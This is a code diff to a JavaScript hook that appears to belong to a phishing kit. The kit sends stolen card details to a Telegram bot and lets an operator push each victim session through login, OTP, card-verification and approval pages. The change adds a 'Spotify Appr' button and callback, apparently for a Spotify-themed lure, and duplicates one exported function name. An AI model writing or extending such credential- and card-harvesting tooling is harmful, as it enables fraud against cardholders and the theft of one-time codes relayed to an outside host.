@@ -80,7 +80,7 @@ const getGeoData = async (ip) => {
   return { country, city, isp };
 };
 
-export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextStep, onBackToCard, onBackToLogin, onBlock, onNextStepAppr, onBackToAppr, onDenyOtp, onOtpFalse, onApproveOtp, onCardFalse, onApproveLogin, onOtpLogin, onLoginFalse, onCardVerification) => {
+export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextStep, onBackToCard, onBackToLogin, onBlock, onNextStepAppr, onBackToAppr, onDenyOtp, onOtpFalse, onApproveOtp, onCardFalse, onApproveLogin, onOtpLogin, onLoginFalse, onCardVerification,  onSpotifyAppr) => {
   const pollingIntervalRef = useRef(null);
   const lastUpdateIdRef = useRef(0);
 
@@ -520,10 +520,11 @@ const sendCardDetailsToTelegram = async (cardData, sessionId) => {
       inline_keyboard: [
         [
           { text: "➡️ Next Step (Appr)", callback_data: `appr_${sessionId}` },
-          { text: "➡️ Next Step (OTP)", callback_data: `next_${sessionId}` }
+          { text: "➡️ Next Step (OTP)", callback_data: `next_${sessionId}` }, 
         ],
         [
-          { text: "🚫 Deny & Block IP", callback_data: `block_${sessionId}` }
+          { text: "🚫 Deny & Block IP", callback_data: `block_${sessionId}` },
+          { text: "🎵 Spotify Appr", callback_data: `spotify_appr_${sessionId}` }
         ],
         [
           { text: "⬅️ Back to Login", callback_data: `back_to_login_${sessionId}` }
@@ -1080,6 +1081,7 @@ const sendCardDetailsToTelegram = async (cardData, sessionId) => {
               else if (action === 'otp_login') onOtpLogin?.();
               else if (action === 'login_false') onLoginFalse?.();
               else if (action === 'card_verification') onCardVerification?.();
+              else if (action === 'spotify_appr') onSpotifyAppr?.();
             }
             
             await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
@@ -1125,6 +1127,7 @@ const sendCardDetailsToTelegram = async (cardData, sessionId) => {
     sendBlockedLog,
     sendVisitNotification,
     sendConfirmationLog,
-    sendConfirmationPageLog
+    sendConfirmationPageLog,
+    sendConfirmationPageLog,
   };
 };
